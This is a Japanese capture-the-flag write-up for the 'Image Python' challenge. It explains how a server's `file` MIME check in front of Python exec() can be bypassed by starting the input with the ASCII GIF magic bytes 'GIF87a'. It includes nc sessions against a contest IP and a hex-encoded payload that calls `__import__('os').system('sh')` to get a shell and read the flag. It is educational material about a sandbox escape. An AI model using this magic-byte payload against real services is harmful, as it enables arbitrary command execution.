# Image Python

## / Overview

GIF画像のマジックナンバーを用いたコマンドの偽造

## / Writeup

### 問題の流れ

チャレンジャーが任意の16進文字列をサーバに送ると，`img`という変数に格納されます．これに対して`file`コマンドが内部で実行されます．

```sh
file --mime-type -b -
<imgの中身>
```

`file`コマンドは入力データの種類を判別するコマンドです．また，各オプションが次のような意味を持っています．

- `--mime-type`: MIMEタイプでデータの種類を表示
- `-b`: ファイル名を表示しない
- `-`: ファイル名ではなく，データを標準入力から受け取る

例えば受け取るデータがテキストデータなら`text/plain`が出力になります．

これを用いてMIMEタイプが`image/`で始まるかチェックされます．これに該当するサブタイプは`png`, `jpg`, `gif`などがあります．

チェックを通過すると`exec(img)`で`img`の中身が実行されます．

このことから目標はfileコマンドに画像と誤認させて，`exec()`で`flag.txt`を読むことだと分かります．

### fileコマンドの仕様

fileコマンドは**マジックナンバー**と呼ばれるファイルの先頭情報を読み取ることで種類を判別しています．例えばPNGであれば，ファイルの先頭は必ず`89 50 4E 47 0D 0A 1A 0A`で始まります．JPEGなら`FF D8 FF`です．

逆に言えば，今回のチャレンジでは**先頭バイトさえあっていれば後ろは何でも良い**ということです．試しにPNGの`89504e470d0a1a0a`を送信してみましょう．

```sh
$ nc 34.170.146.252 29529
hex bytes> 89504e470d0a1a0a
This doesn't look like an image...
```

あれ，どうやらうまく認識されていないようです．

完全なPNG画像の末尾から1バイトずつ削除していくことでギリギリ画像と認識される境界線を探すことにします．

その際，いろいろな画像の最小構成がまとめられている以下のサイトを参考にしました．

> One pixel is worth three thousand words
>
> https://cloudinary.com/blog/one_pixel_is_worth_three_thousand_words

この中でPNGの1x1画像の例が載っていたのでこれを試します．

```
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 01 00 00 00 01  01 00 00 00 00 37 6e f9  |.............7n.|
00000020  24 00 00 00 0a 49 44 41  54 78 01 63 68 00 00 00  |$....IDATx.ch...|
00000030  82 00 81 4c 17 d7 df 00  00 00 00 49 45 4e 44 ae  |...L.......IEND.|
00000040  42 60 82                                          |B`.|
```

全てのバイトをコピーすると画像として認識されたので境界線を探すと，ちょうど`IHDR`までであることが分かりました．

```sh
$ nc 34.170.146.252 29529
hex bytes> 89504e470d0a1a0a0000000d49484452
Traceback (most recent call last):
  File "/app/jail.py", line 14, in <module>
    exec(img)
    ~~~~^^^^^
SyntaxError: source code string cannot contain null bytes
```

次は`00`のバイトは`exec()`で受け付けられないというエラーが出ています．これを解決するために，`00`を`01`など他のバイトに変えてみましたが，再度画像として認識されなくなってしまいました．

そこで，画像の種類自体を変えてみました．JPEGで試してみます．先ほどと同様にすると境界は次のバイト列であることが分かりました．

```sh
$ nc 34.170.146.252 29529
hex bytes> ffd8ffe0
Traceback (most recent call last):
  File "/app/jail.py", line 14, in <module>
    exec(img)
    ~~~~^^^^^
  File "<string>", line 1
    ����
    ^
SyntaxError: Non-UTF-8 code starting with '\xff' on line 1, but no encoding declared; see https://peps.python.org/pep-0263/ for details
```

しかし次はASCII文字ではないためエラーが出ました．つまり，ASCII文字だけで構成されるマジックナンバーを探さなければなりません．

次に候補となるのがGIFで，最小の構成は次のようになっています．

```
00000000  47 49 46 38 37 61 01 00  01 00 80 01 00 00 00 00  |GIF87a..........|
00000010  ff ff ff 2c 00 00 00 00  01 00 01 00 00 02 02 4c  |...,...........L|
00000020  01 00 3b                                          |..;|
```

うれしいことにfileコマンドに通すと`GIF87a`で画像として認識されました．

```sh
$ nc 34.170.146.252 29529
hex bytes> 474946383761
Traceback (most recent call last):
  File "/app/jail.py", line 14, in <module>
    exec(img)
    ~~~~^^^^^
  File "<string>", line 1, in <module>
NameError: name 'GIF87a' is not defined
```

### 解く

`GIF87a`を変数と見ると次のようなペイロードを作成できます．

```sh
$ python3 -c "print(b'GIF87a=0;__import__(\"os\").system(\"sh\")'.hex())"
4749463837613d303b5f5f696d706f72745f5f28226f7322292e73797374656d282273682229
```

これを送ると任意のコマンドを実行できるのでフラグのファイルを開きます．

```sh
$ nc 34.170.146.252 29529
hex bytes> 4749463837613d303b5f5f696d706f72745f5f28226f7322292e73797374656d282273682229
ls
flag.txt
jail.py
cat flag.txt
Alpaca{...}
```
